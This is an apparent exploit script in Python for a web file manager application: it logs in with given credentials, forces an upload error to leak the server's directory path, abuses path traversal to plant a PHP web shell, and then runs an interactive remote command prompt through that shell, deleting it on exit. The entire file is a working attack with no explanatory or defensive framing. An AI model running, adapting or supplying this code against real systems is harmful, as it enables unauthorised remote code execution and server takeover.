#
#

import sys
url = str(sys.argv[1])
fm_usr = str(sys.argv[2])
fm_pwd = str(sys.argv[3])
if len(sys.argv) == 4:
	if sys.argv[1].startswith("http://"):
			creds = {"fm_usr":f"{fm_usr}","fm_pwd":f"{fm_pwd}"}
			header={"Cookie":"filemanager=abcdefghijklmnopqrstuvwzxz","User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"}
			req=requests.post(url, data=creds, headers=header)
			cookie="filemanager=abcdefghijklmnopqrstuvwzxz"
			
			header1 = {"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","Cookie":"filemanager=abcdefghijklmnopqrstuvwzxz","User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"}
			
			payload={"type":"upload","uploadurl":"http://sjlkjnaljsnkjsnlakjsnakjs.dhdhdhdhllk/","ajax":"true"}
			leak=requests.post(url+"?p=&upload", data=payload, headers=header1)
			error_msg = eval(leak.text.replace("\\",""))
			path=error_msg["fail"]["file"]
			dir_path=path.split("/")[:-1]
			dir_path.remove("")
			fullpath=""
			for i in dir_path:
				append = "/"+i
				fullpath+=append
			
			filename = "pwn_" + str(hash(random.random())) + ".php"
			
			datas={"p":"","fullpath":f"../../../../../../../{fullpath}/{filename}"}
			files={"file":("feb.php","<?php system($_REQUEST['cmd']); ?>","application/x-php")}
			header={"Cookie":cookie,"User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"}
			upload=requests.post(sys.argv[1],data=datas, files=files, headers=header)
			success=eval(upload.text)
			host=str(sys.argv[1]).replace("http://","").split("/")[0]
			if success["info"] == "file upload successful":
				shell=requests.get('http://'+host+'/'+filename)
				if shell.status_code == 200:
					while True:
						cnc = input("sh31l$> ")
						if cnc == "exit" or cnc == "quit":
							cleanup = requests.post('http://'+host+'/'+filename,data={"cmd":f"rm -f {fullpath}/{filename}"})
							sys.exit()
						else:

							cmd = {"cmd":str(cnc)}
							execute = requests.post('http://'+host+'/'+filename, data=cmd)
				else:
					sys.exit()
				
			else:
				exit()